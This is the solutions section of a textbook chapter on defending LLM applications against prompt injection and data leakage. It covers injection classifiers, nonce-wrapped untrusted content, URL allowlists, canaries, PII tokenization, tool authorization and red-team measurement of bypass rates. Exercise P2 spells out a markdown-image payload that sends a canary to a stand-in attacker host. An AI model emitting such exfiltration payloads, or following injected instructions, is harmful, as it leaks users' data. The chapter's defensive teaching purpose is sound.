# Chapter 27 — Solutions

## Knowledge questions

**K1.** Input: boundary is `SizeLimitCheck` (deterministic cap, fail-closed); sensor is
`InjectionHeuristicCheck` or `LLMInjectionClassifier`. Context: boundary is the sanitizer's removal of
carriers plus nonce wrapping (deterministic transformation, fail-closed), with the tenancy assertion on the
records themselves; sensor is the injection heuristic run on documents. Output: boundaries are
`UrlAllowlistCheck`, `CanaryCheck`, `SchemaCheck`, `CitationCheck`, and secret blocking; sensor is
`ActiveContentCheck` (it exists to reveal a broken consumer) and moderation. Tool: boundaries are the tool
allowlist, argument constraints, outbound scan, approval token, budget, and the delegate authorizer. The
tool stage has no natural sensor because any signal there must translate into a decision: a proposed call
either has authority or it does not. Anomaly scoring on tool sequences can be added as a sensor, but it
must never be the thing that permits a call.

**K2.** Injection phrasing is unbounded and attacker-controlled, so any detector has a material
false-positive rate (the kiosk "system message" question) and a material bypass rate (paraphrase,
translation). Blocking on it refuses legitimate users while still missing attacks. It fails open because it
protects nothing by itself: when it is down, effect-level controls still hold, so the only loss is
visibility, which the error flag reports. Blocking is defensible on a narrow surface with a measured,
very low FP rate on real traffic, high-impact downstream capabilities, and an easy recovery path for users
(for example a public form that feeds an agent with outbound tools, where a false block means "rephrase").
Even then it is an addition, not a replacement for authorization.

**K3.** The closing tag is `</untrusted_data nonce="...">` with a random per-request nonce. Any
`<untrusted_data ...>` or `</untrusted_data>` in the content is HTML-escaped, so the content contains no
delimiter the model or a parser would read as the end of the block, and an author writing the document
earlier cannot know the nonce of a future request. The wrapper does not prevent the model from following
an instruction that stays inside the block; it only labels provenance. Injection resistance still comes
from the effect-level controls.

**K4.** Regexes for long digit runs match order numbers, tracking ids, and timestamps. Luhn removes
almost all random 13 to 19 digit strings that are not card numbers (about 90 percent of random strings
fail it) and catches single-digit typos and most adjacent transpositions. IBAN mod-97 plus the
per-country length removes random alphanumerics that happen to start with two letters and two digits and
catches nearly all single errors. Northwind example: `TX-2025-0293-118-0007` from the tickets has 15
digits with separators and would be reported as a phone number by a naive pattern; `PR-2026-00912` and
`RET-20260215-004412` are similar.

**K5.** Masking replaces the value irreversibly with a format that keeps a little utility
(`[CARD ****1111]`). Tokenization replaces it with an HMAC-derived token stored in a per-conversation
vault so the value can be restored later. `rehydrate` returns a value only when (1) the caller's tenant
equals the vault's tenant, (2) the token exists in this vault (not invented, forged, from another vault, or
cleared), and (3) the rehydration policy approves that PII kind for this caller.

**K6.** False-positive rate: benign cases the check reacted to (flag, redact, or block) divided by benign
cases. Bypass rate: attack cases the check allowed, divided by attack cases. Effect bypass rate: end-to-end
red-team scenarios where the harmful effect occurred, divided by scenarios, measured with a simulated model
that complies with every payload. Gate on effect bypass rate first, because it measures the property the
system promises (no unauthorized effect) and is robust to which layer did the work; then add FP gates on
blocking checks to stop regressions that hurt users.

## Engineering questions

**E1.** Assets change: anonymous public users, more abuse, regulatory exposure for customer PII, and
reputational risk from harmful content. Changes: size limits drop and add per-IP and per-session rate
limits (denial of wallet from anonymous traffic). Moderation becomes fail-closed on output for the
categories that create legal or brand exposure, with stricter thresholds, because a public outage of
moderation is preferable to unmoderated public output; input moderation can stay fail-open with alerts.
The injection classifier is added on input as a router: flagged sessions lose tool access. PII handling
switches to tokenization of card numbers and IBANs in input, since the bot only needs to reference them,
and masks everything in logs. Tools shrink to read-only order lookup authorized by an order token the
customer holds (no employee data reachable at all), and any refund is a deterministic workflow outside the
model with step-up verification. Tenant scope is fixed to `retail` and the customer's own records, asserted
on every tool result. The URL allowlist narrows to the public site and CSP applies to the widget. New
checks: a topic allowlist (returns, shipping, order status) with a polite refusal outside it, and an
output check against promising things only policy can grant (refund amounts), backed by structured output
that separates the answer from any proposed action.

**E2.** Against silent stripping: users and auditors lose the signal that something was removed, support
cannot explain a broken-looking answer, and a reviewer cannot see attack attempts. A design that satisfies
both: render a neutral, styled affordance ("link removed for safety") instead of raw bracket text, so it
looks intentional; record each removal as a structured finding on the span and in an audit table keyed by
request id with the host (never the full URL with its query string, which may carry exfiltrated data); and
show internal users a details view. For outbound channels such as email, keep `mode="block"`, because a
silently edited message is worse than a refusal.

**E3.** Buffer the stream into segments that end at a newline or sentence boundary and at least after any
open markdown construct (`![`, `[`, `<`) has closed or a maximum buffer size forces a decision. Per segment:
URL allowlist, canary, secret blocking, active content, PII redaction. On the full answer at the end:
citation validation, schema validation if structured, and model-based moderation if used. If a full-answer
check blocks after segments were shown, the UI replaces the displayed answer with the fallback and a
notice, and the event is logged as a post-display block; design so only checks that can only run on the
whole answer can cause this, and prefer abstention over partial answers on grounded paths (hold the answer
until citations validate if the surface demands it). Latency cost: one segment of hold-back, typically a
few hundred milliseconds of perceived delay (illustrative), plus any full-answer check on completion.

**E4.** Run the deterministic input checks first; send only requests that the heuristic flags, that come
from new or low-reputation principals, or that are bound for tool-enabled paths to the classifier
synchronously. Run the classifier asynchronously, in parallel with retrieval, for everything else, and use
its result to alert and to downgrade the session (remove tools on the next turn) rather than to gate the
current answer. Verify by running the red-team suite and the measurement script before and after: the
effect bypass rate must stay at zero, and the classifier's measured recall on the sampled subset must not
fall below the full-traffic recall by more than the confidence interval. Also replay a week of flagged
traffic through both configurations and compare which requests reached tool-enabled paths.

**E5.** Accept the first proposal conditionally and reject the second. A guard model is a sensor: it plugs in as a `Moderator` adapter behind `ModerationCheck` (category scores, per-category thresholds) and as an injection `Check` at the input and context stages that flags, fails open, and has a client timeout. Keep the heuristic in front of it as a cheap first pass unless the measurement shows it adds nothing. Before switching, require: the measurement script on your own labeled benign and attack sets, with false-positive and bypass rates and intervals at least as good as the current checks; per-language and per-category results for the languages you serve; p95 latency within the stage budget; a pinned model version and an owner for the GPU service. The recipient allowlist stays: it is a boundary with no false negatives on what it covers, it does not depend on recognizing the attack, and removing it would leave a sensor as the only control in front of an outbound effect. The red team with `--max-effect-bypass 0.0` must pass unchanged.

## Practical exercises

**P1.** Expected: a regex and a validator function (for example a national identifier whose last digit is a
mod-11 or Luhn-style check digit), the new kind added to `ALL_KINDS` at a priority below card and IBAN, mask
format `[NATIONAL_ID]`, and tests: three or more valid identifiers detected, at least three Northwind-style
reference strings (`TX-2025-0293-118-0007`, `INC-2291`, `RET-20260215-004412`) not detected, and an invalid
check digit rejected. Acceptance: measuring with `detect_pii(text, kinds=["national_id"])` over the shared
tickets reports zero detections unless a ticket genuinely contains one, and the full test suite still
passes.

**P2.** Expected: a class that consumes `StreamEvent`s, appends `text_delta`s to a buffer, emits a segment
when a boundary condition holds (newline or sentence end, no unclosed `![`, `[`, `(`, or `<`, or the buffer
exceeds a maximum), runs `pipeline.check_output(segment, ctx)`, yields the redacted text if allowed, and on
block yields a fallback and stops. Test: feed `"See ![x](https://coll"`, `"ector.attacker.example/p.png?d="`,
`"NW-CANARY-...)"` as three deltas and assert the concatenated yielded text contains neither the host nor
the canary, and that no partial chunk was yielded before the check ran (assert on yield order with a
recording checker).

**P3.** Expected: a function `make_authorizer(engine, registry, to_tool_context)` that looks up the Chapter
16 `Tool` by name, validates arguments with its schema (invalid arguments become a deny), converts
`GuardContext` to `ToolContext` (tenant, user, groups, scopes from the trusted session), calls
`engine.evaluate(tool, args, ctx, consume=False)` for the guardrail decision, and maps `ALLOW` to
`ToolDecision(True)`, `NEEDS_APPROVAL` to `ToolDecision(False, needs_approval=True, ...)`, and `DENY` to
`ToolDecision(False, reason=...)`. Test: configure `engine.deny_tool_for_group("contractors",
"send_reply")`, give the context the `contractors` group, propose an otherwise valid and approved
`send_reply`, and assert the pipeline blocks with the engine's reason and no effect occurs in the red-team
harness. Acceptance: approval tokens computed by both layers agree on the same arguments.

**P4.** Expected: an argument that parses `check=rate` pairs, a gate applied after `run()`, a new JSONL of
30 or more benign questions, and a short report: FP and bypass counts with Wilson intervals before and
after a single weight change. Acceptance: the change is kept only if the FP interval does not shift up and
the bypass interval does not shift up in a way the intervals can distinguish; with small sets the honest
outcome is often "no detectable difference," and the report should say so rather than claim improvement.

## Debugging exercises

**D1.** Root cause: the approval is stored where the retry cannot see it, or the retry is not the same call.
The two common variants: (a) `ctx.approvals` lives on the request-scoped `GuardContext`, and the retry runs in
a new request whose context was built without loading approvals from the approval store, so the token is
missing; (b) the model re-proposed the call with slightly different arguments (a trailing newline or a
regenerated body), so the new `approval_token` differs from the approved one even though the UI looks
identical. Compare the `approval_token` in the blocked verdict's metadata on the retry with the token the
approval UI recorded (`ui.approval approval_token`). If they match, the approval store is not loaded into the
context: fix by loading approved tokens for the session into `ctx.approvals` when building the context. If
they differ, fix by executing the approved, persisted call (the exact arguments the human saw) rather than
asking the model to propose it again.

**D2.** The classifier's behavior changed without your code changing: most likely the provider updated the
model behind the alias, or the classifier prompt or schema in configuration changed. Confirm by comparing
the `model` and provider fields recorded on classifier completions before and after the jump, by the
clustering of confidence near 0.91 (just above the 0.9 block threshold), and by replaying last week's
benign sample through the classifier now: if old benign traffic now blocks, the classifier drifted.
Immediate remediation: raise the block threshold or switch the classifier to flag-only (it is a sensor),
which restores service while the effect controls keep holding. Durable: pin the classifier model version,
add the benign set as an FP gate that runs on any classifier change, and alert on block-rate step changes
per check.

**D3.** The leak is outside the guardrail pipeline: the `llm.call` spans are emitted by the model gateway in
`aie_core` with a tracer that is not wrapped in `RedactingTracer` (for example `get_tracer()` was passed to
the gateway directly while only the guardrail pipeline received the redacting wrapper), or the gateway
records prompt content under an attribute name that `drop_keys` does not cover and `scrub` did not
recognize. A third cause looks configured but is not: the `RedactingTracer` was installed as the *sink* of
Chapter 31's `OTelAITracer` (`OTelAITracer(provider, sink=RedactingTracer(...))`). The OpenTelemetry span
receives its attributes in `_backend_end`, before the sink's `export` runs, so the JSONL copy is clean while
the tracing backend holds raw values; compare the same span in both stores to confirm. Fix by constructing
one redacting tracer that *wraps* the application tracer and injecting it everywhere, and by dropping prompt
and completion attributes by policy. The test that would have caught it: run one request containing a known
email and a canary through the full application (gateway plus pipeline) with an in-memory tracer wrapped
once at the composition root, then assert that no exported span from any component contains the email or
the canary, which is the "secret exposure in logs and traces" item from Chapter 26's red-team list.
